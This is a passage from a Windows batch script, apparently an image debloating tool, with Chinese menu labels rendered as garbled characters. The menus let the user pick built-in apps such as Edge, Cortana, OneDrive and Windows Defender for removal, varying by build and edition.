	echo.   ^|   [H] Ŀ�ӿ���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] �ļ���Դ������Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] ����Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ��ͼ�ؼ�                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps1"
	if !errorlevel!==12 set "Component=NarratorQuickStart"
	if !errorlevel!==11 set "Component=MapControl"
	if !errorlevel!==10 set "Component=LockApp"
	if !errorlevel!==9  set "Component=FileExplorer"
	if !errorlevel!==8  set "Component=ECApp"
	if !errorlevel!==7  set "Component=EdgeDevToolsClient"
	if !errorlevel!==6  set "Component=Cortana"
	if !errorlevel!==5  set "Component=ContentDeliveryManager"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ______________________________ ϵͳӦ��һ ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] ָ����������Ӧ�� ^| �����ڣ�����ķ���Ȩ��                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX ������                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ����ע��Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ����Ӧ��                                                         ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Content Delivery Manager ^| ��Ҫȫ������Ӧ�ó���                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Cortana����ʼ�˵�����������Ӧ�� ^| �����ڣ�����ʶ��               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Edge                                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Ŀ�ӿ���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] �ļ���Դ������Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ����Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ��ͼ�ؼ�                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==15 goto :RemoveSystemAppsMenu
	if !errorlevel!==14 set "Component=SystemApps1"
	if !errorlevel!==13 set "Component=NarratorQuickStart"
	if !errorlevel!==12 set "Component=MapControl"
	if !errorlevel!==11 set "Component=LockApp"
	if !errorlevel!==10 set "Component=FileExplorer"
	if !errorlevel!==9  set "Component=ECApp"
	if !errorlevel!==8  set "Component=Edge"
	if !errorlevel!==7  set "Component=Cortana"
	if !errorlevel!==6  set "Component=ContentDeliveryManager"
	if !errorlevel!==5  set "Component=PPIProjection"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" (
	echo.        
	echo.    ______________________________ ϵͳӦ��һ ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] ָ����������Ӧ�� ^| �����ڣ�����ķ���Ȩ��                        ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] Azure Active Directory AppX ������                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ����ע��Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] Camera Barcode Scanner                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Content Delivery Manager ^| ��Ҫȫ������Ӧ�ó���                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Edge                                                             ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Ŀ�ӿ���Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] �ļ���Դ������Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] ����Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] ��ͼ�ؼ�                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Narrator QuickStart                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] OneDrive ����ͻ���                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps1"
	if !errorlevel!==12 set "Component=OneDrive"
	if !errorlevel!==11 set "Component=NarratorQuickStart"
	if !errorlevel!==10 set "Component=MapControl"
	if !errorlevel!==9  set "Component=LockApp"
	if !errorlevel!==8  set "Component=FileExplorer"
	if !errorlevel!==7  set "Component=ECApp"
	if !errorlevel!==6  set "Component=Edge"
	if !errorlevel!==5  set "Component=ContentDeliveryManager"
	if !errorlevel!==4  set "Component=CBSPreview"
	if !errorlevel!==3  set "Component=BioEnrollment"
	if !errorlevel!==2  set "Component=AADBrokerPlugin"
	if !errorlevel!==1  set "Component=AssignedAccessLockApp"
	goto :RemoveWindowsComponents
)

:RemoveSystemAppsMenu2
cls&mode con cols=80 lines=40&title ����ϵͳӦ�ö�
set "goto=:RemoveSystemAppsMenu2"
if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseS" (
	echo.        
	echo.    ______________________________ ϵͳӦ�ö� ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҳ�����Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ������                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ������ʾ����                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ����ͬ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Smart Screen ^| �����ڣ�Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Win32 Web View ����                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Windows Defender Ӧ��                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Windows �����ʵ                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows PDF �Ķ���                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps2"
	if !errorlevel!==12 set "Component=XboxGameCallableUI"
	if !errorlevel!==11 set "Component=WindowsReaderPDF"
	if !errorlevel!==10 set "Component=WindowsMixedReality"
	if !errorlevel!==9 set "Component=WindowsDefender"
	if !errorlevel!==8 set "Component=Win32WebViewHost"
	if !errorlevel!==7 set "Component=SmartScreen"
	if !errorlevel!==6 set "Component=SkypeORTC"
	if !errorlevel!==5 set "Component=SettingSync"
	if !errorlevel!==4 set "Component=RetailDemoContent"
	if !errorlevel!==3 set "Component=QuickAssist"
	if !errorlevel!==2 set "Component=PeopleExperienceHost"
	if !errorlevel!==1 set "Component=ParentalControls"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "17763" if "!ImageFlag!" equ "EnterpriseSN" (
	echo.        
	echo.    ______________________________ ϵͳӦ�ö� ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҳ�����Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ������                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ������ʾ����                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ����ͬ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Smart Screen ^| �����ڣ�Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Win32 Web View ����                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Windows Defender Ӧ��                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Windows �����ʵ                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows PDF �Ķ���                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps2"
	if !errorlevel!==12 set "Component=XboxGameCallableUI"
	if !errorlevel!==11 set "Component=WindowsReaderPDF"
	if !errorlevel!==10 set "Component=WindowsMixedReality"
	if !errorlevel!==9 set "Component=WindowsDefender"
	if !errorlevel!==8 set "Component=Win32WebViewHost"
	if !errorlevel!==7 set "Component=SmartScreen"
	if !errorlevel!==6 set "Component=SkypeORTC"
	if !errorlevel!==5 set "Component=SettingSync"
	if !errorlevel!==4 set "Component=RetailDemoContent"
	if !errorlevel!==3 set "Component=QuickAssist"
	if !errorlevel!==2 set "Component=PeopleExperienceHost"
	if !errorlevel!==1 set "Component=ParentalControls"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ______________________________ ϵͳӦ�ö� ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] OneDrive ����ͻ���                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] �ҳ�����Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ������                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ������ʾ����                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ����ͬ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Smart Screen ^| �����ڣ�Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Take Test Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Win32 Web View ����                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows Defender Ӧ��                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Windows �����ʵ                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==15 goto :RemoveSystemAppsMenu
	if !errorlevel!==14 set "Component=SystemApps2"
	if !errorlevel!==13 set "Component=XboxGameCallableUI"
	if !errorlevel!==12 set "Component=WindowsMixedReality"
	if !errorlevel!==11 set "Component=WindowsDefender"
	if !errorlevel!==10 set "Component=Win32WebViewHost"
	if !errorlevel!==9 set "Component=SecureAssessmentBrowser"
	if !errorlevel!==8 set "Component=SmartScreen"
	if !errorlevel!==7 set "Component=SkypeORTC"
	if !errorlevel!==6 set "Component=SettingSync"
	if !errorlevel!==5 set "Component=RetailDemoContent"
	if !errorlevel!==4 set "Component=QuickAssist"
	if !errorlevel!==3 set "Component=PeopleExperienceHost"
	if !errorlevel!==2 set "Component=ParentalControls"
	if !errorlevel!==1 set "Component=OneDrive"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" (
	echo.        
	echo.    ______________________________ ϵͳӦ�ö� ______________________________
	echo.   ^|                              ------------                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] �ҳ�����Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ������                                                           ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ������ʾ����                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ����ͬ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] Skype ORTC                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] Smart Screen ^| �����ڣ�Windows Defender                          ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] Take Test Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Win32 Web View ����                                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Windows Defender Ӧ��                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] Windows �����ʵ                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] Xbox Game Callable UI                                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==14 goto :RemoveSystemAppsMenu
	if !errorlevel!==13 set "Component=SystemApps2"
	if !errorlevel!==12 set "Component=XboxGameCallableUI"
	if !errorlevel!==11 set "Component=WindowsMixedReality"
	if !errorlevel!==10 set "Component=WindowsDefender"
	if !errorlevel!==9 set "Component=Win32WebViewHost"
	if !errorlevel!==8 set "Component=SecureAssessmentBrowser"
	if !errorlevel!==7 set "Component=SmartScreen"
	if !errorlevel!==6 set "Component=SkypeORTC"
	if !errorlevel!==5 set "Component=SettingSync"
	if !errorlevel!==4 set "Component=RetailDemoContent"
	if !errorlevel!==3 set "Component=QuickAssist"
	if !errorlevel!==2 set "Component=PeopleExperienceHost"
	if !errorlevel!==1 set "Component=ParentalControls"
	goto :RemoveWindowsComponents
)

:RemoveWindowsAppsMenu
cls&mode con cols=80 lines=30&title ����Windows Ӧ��
set "goto="
echo.        
echo.    _____________________________ Windows Ӧ�� _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] WindowsӦ��һ                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] WindowsӦ�ö�                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] WindowsӦ����                                                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] ����                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /C:123X /n /m ">>>>>>>������ѡ��:"
if !errorlevel!==4 goto :RemoveMenu
if !errorlevel!==3 goto :RemoveWindowsAppsMenu3
if !errorlevel!==2 goto :RemoveWindowsAppsMenu2
if !errorlevel!==1 goto :RemoveWindowsAppsMenu1

:RemoveWindowsAppsMenu1
cls&mode con cols=80 lines=48&title ����WindowsӦ��һ
set "goto=:RemoveWindowsAppsMenu1"
if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x86" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows Ӧ��һ ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ���Ӻ�ʱ��Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ������Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ���Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ����Ӧ�ð�װ����                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] ��Ӱ�͵���Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] ��ȡ����                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google �� VP9 WebM ��Ƶ����������                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove ����Ӧ��                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ��Чͼ���ļ� ^(HEIF^) ����������                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ��ͼӦ�� ^| �����ڣ���ͼ�ؼ�                                      ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] ��ϢӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] Microsoft Pay Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] �����ʵ�鿴��Ӧ�� ^| �����ڣ�Windows Mixed Reality               ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] �ƶ��ײ�Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps1"
	if !errorlevel!==16 set "Component=OneConnect"
	if !errorlevel!==15 set "Component=3DViewer"
	if !errorlevel!==14 set "Component=WalletService"
	if !errorlevel!==13 set "Component=Messaging"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=ZuneVideo"
	if !errorlevel!==6  set "Component=FeedbackHub"
	if !errorlevel!==5  set "Component=DesktopAppInstaller"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" geq "17763" if "!ImageBuild!" leq "18363" if "x!Bit!" equ "x64" if "!ImageFlag!" neq "EnterpriseS" if "!ImageFlag!" neq "EnterpriseSN" (
	echo.        
	echo.    ____________________________ Windows Ӧ��һ ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ���Ӻ�ʱ��Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ������Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ���Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] ����Ӧ�ð�װ����                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] ��Ӱ�͵���Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] ��ȡ����                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google �� VP9 WebM ��Ƶ����������                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove ����Ӧ��                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ��Чͼ���ļ� ^(HEIF^) ����������                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ��ͼӦ�� ^| �����ڣ���ͼ�ؼ�                                      ^|
	echo.   ^|                                                                        ^|	
	echo.   ^|   [M] ��ϢӦ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] Microsoft Pay Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] �����ʵ�鿴��Ӧ�� ^| �����ڣ�Windows Mixed Reality               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] �����ʵ�鿴��Ӧ�� ^| �����ڣ�Windows �����ʵ                    ^|	
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] �ƶ��ײ�Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [R] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQRX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==19 goto :RemoveWindowsAppsMenu
	if !errorlevel!==18 set "Component=WindowsApps1"
	if !errorlevel!==17 set "Component=OneConnect"
	if !errorlevel!==16 set "Component=3DViewer"
	if !errorlevel!==15 set "Component=MixedRealityPortal"
	if !errorlevel!==14 set "Component=WalletService"
	if !errorlevel!==13 set "Component=Messaging"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=ZuneVideo"
	if !errorlevel!==6  set "Component=FeedbackHub"
	if !errorlevel!==5  set "Component=DesktopAppInstaller"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x86" (
	echo.        
	echo.    ____________________________ Windows Ӧ��һ ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ���Ӻ�ʱ��Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ������Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ���Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Cortana Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ����Ӧ�ð�װ����                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] ��ȡ����                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google �� VP9 WebM ��Ƶ����������                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove ����Ӧ��                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ��Чͼ���ļ� ^(HEIF^) ����������                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ��ͼӦ�� ^| �����ڣ���ͼ�ؼ�                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Microsoft Pay Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] �����ʵ�鿴��Ӧ�� ^| �����ڣ�Windows �����ʵ                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] ��Ӱ�͵���Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==17 goto :RemoveWindowsAppsMenu
	if !errorlevel!==16 set "Component=WindowsApps1"
	if !errorlevel!==15 set "Component=ZuneVideo"
	if !errorlevel!==14 set "Component=3DViewer"
	if !errorlevel!==13 set "Component=WalletService"
	if !errorlevel!==12 set "Component=Maps"
	if !errorlevel!==11 set "Component=HEIFImageExtension"
	if !errorlevel!==10 set "Component=ZuneMusic"
	if !errorlevel!==9  set "Component=VP9VideoExtensions"
	if !errorlevel!==8  set "Component=GetHelp"
	if !errorlevel!==7  set "Component=FeedbackHub"
	if !errorlevel!==6  set "Component=DesktopAppInstaller"
	if !errorlevel!==5  set "Component=Cortana"
	if !errorlevel!==4  set "Component=Camera"
	if !errorlevel!==3  set "Component=Calculator"	
	if !errorlevel!==2  set "Component=Alarms"
	if !errorlevel!==1  set "Component=AdvertisingXaml"
	goto :RemoveWindowsComponents
)

if "!Version!" equ "10" if "!ImageBuild!" equ "19041" if "x!Bit!" equ "x64" (
	echo.        
	echo.    ____________________________ Windows Ӧ��һ ____________________________
	echo.   ^|                            ----------------                            ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [A] Advertising Xaml                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [B] ���Ӻ�ʱ��Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [C] ������Ӧ��                                                       ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [D] ���Ӧ��                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [E] Cortana Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [F] ����Ӧ�ð�װ����                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [G] ��������Ӧ��                                                     ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [H] ��ȡ����                                                         ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [I] Google �� VP9 WebM ��Ƶ����������                              ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [J] Groove ����Ӧ��                                                  ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [K] ��Чͼ���ļ� ^(HEIF^) ����������                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [L] ��ͼӦ�� ^| �����ڣ���ͼ�ؼ�                                      ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [M] Microsoft Pay Ӧ��                                               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [N] �����ʵ�鿴��Ӧ�� ^| �����ڣ�Windows �����ʵ                    ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [O] �����ʵ�鿴��Ӧ�� ^| �����ڣ�Windows Mixed Reality               ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [P] ��Ӱ�͵���Ӧ��                                                   ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [Q] �Ƴ�����ȫ��ѡ��                                                 ^|
	echo.   ^|                                                                        ^|
	echo.   ^|   [X] ����                                                             ^|
	echo.   ^|                                                                        ^|
		echo.
	choice /C:ABCDEFGHIJKLMNOPQX /N /M ">>>>>>>������ѡ��:"
	if !errorlevel!==18 goto :RemoveWindowsAppsMenu
	if !errorlevel!==17 set "Component=WindowsApps1"
	if !errorlevel!==16 set "Component=ZuneVideo"
